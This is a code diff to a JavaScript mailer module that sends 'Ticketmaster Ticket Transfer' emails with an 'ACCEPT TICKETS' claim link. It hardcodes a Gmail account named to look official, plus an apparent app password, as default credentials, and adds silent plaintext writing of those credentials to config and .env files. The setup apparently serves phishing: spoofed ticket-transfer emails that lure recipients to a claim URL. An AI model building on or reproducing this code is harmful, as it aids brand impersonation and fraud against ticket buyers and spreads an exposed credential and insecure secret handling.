@@ -1,32 +1,78 @@
 // utils/mailer.js — Gmail & SMTP Email Service for Ticketmaster Ticket Transfers
 const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
 
-// In-memory or env-based email configuration
+const CONFIG_FILE = path.join(__dirname, '..', 'gmail_config.json');
+const ENV_FILE = path.join(__dirname, '..', '.env');
+
+// Load persisted config if present
 let emailConfig = {
-  user: process.env.GMAIL_USER || '',
-  pass: process.env.GMAIL_APP_PASSWORD || '',
+  user: process.env.GMAIL_USER || 'noreplyticketmasterauth@gmail.com',
+  pass: process.env.GMAIL_APP_PASSWORD || 'injrseooszfsfton',
   service: 'gmail'
 };
 
+try {
+  if (fs.existsSync(CONFIG_FILE)) {
+    const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
+    if (saved.user && !emailConfig.user) emailConfig.user = saved.user;
+    if (saved.pass && !emailConfig.pass) emailConfig.pass = saved.pass;
+  }
+} catch (e) {}
+
 function getEmailConfig() {
+  const user = process.env.GMAIL_USER || emailConfig.user || '';
+  const pass = process.env.GMAIL_APP_PASSWORD || emailConfig.pass || '';
   return {
-    user: process.env.GMAIL_USER || emailConfig.user || '',
-    isConfigured: !!(process.env.GMAIL_USER || emailConfig.user) && !!(process.env.GMAIL_APP_PASSWORD || emailConfig.pass),
-    maskedUser: (process.env.GMAIL_USER || emailConfig.user)
-      ? (process.env.GMAIL_USER || emailConfig.user).replace(/(.{2})(.*)(?=@)/, (gp1, gp2, gp3) => gp2 + '*'.repeat(gp3.length))
+    user,
+    isConfigured: !!(user && pass),
+    maskedUser: user
+      ? user.replace(/(.{2})(.*)(?=@)/, (gp1, gp2, gp3) => gp2 + '*'.repeat(gp3.length))
       : ''
   };
 }
 
 function updateEmailConfig(user, pass) {
-  if (user) {
+  if (user !== undefined && user.trim()) {
     emailConfig.user = user.trim();
     process.env.GMAIL_USER = user.trim();
   }
-  if (pass) {
+  if (pass !== undefined && pass.trim()) {
     emailConfig.pass = pass.trim();
     process.env.GMAIL_APP_PASSWORD = pass.trim();
   }
+
+  // Persist to gmail_config.json
+  try {
+    fs.writeFileSync(CONFIG_FILE, JSON.stringify({
+      user: emailConfig.user,
+      pass: emailConfig.pass
+    }, null, 2));
+  } catch (e) {}
+
+  // Also update .env file so restarts keep it
+  try {
+    if (fs.existsSync(ENV_FILE)) {
+      let envContent = fs.readFileSync(ENV_FILE, 'utf8');
+      if (emailConfig.user) {
+        if (/^GMAIL_USER=.*$/m.test(envContent)) {
+          envContent = envContent.replace(/^GMAIL_USER=.*$/m, `GMAIL_USER=${emailConfig.user}`);
+        } else {
+          envContent += `\nGMAIL_USER=${emailConfig.user}`;
+        }
+      }
+      if (emailConfig.pass) {
+        if (/^GMAIL_APP_PASSWORD=.*$/m.test(envContent)) {
+          envContent = envContent.replace(/^GMAIL_APP_PASSWORD=.*$/m, `GMAIL_APP_PASSWORD=${emailConfig.pass}`);
+        } else {
+          envContent += `\nGMAIL_APP_PASSWORD=${emailConfig.pass}`;
+        }
+      }
+      fs.writeFileSync(ENV_FILE, envContent, 'utf8');
+    }
+  } catch (e) {}
+
   return getEmailConfig();
 }
 
@@ -363,7 +409,7 @@ function generateTransferEmailHtml({ senderName, recipientName, event, tickets, 
         <table width="100%" cellpadding="0" cellspacing="0">
           <tr>
             <td align="center">
-              <a href="${claimUrl}" class="btn-accept">ACCEPT TICKETS</a>
+              <a href="${claimUrl}" target="_blank" class="btn-accept" style="display:block; width:100%; box-sizing:border-box; background-color:#026cdf; color:#ffffff; text-align:center; padding:14px 20px; border-radius:4px; font-weight:700; font-size:15px; letter-spacing:0.6px; text-decoration:none;">ACCEPT TICKETS</a>
             </td>
           </tr>
         </table>
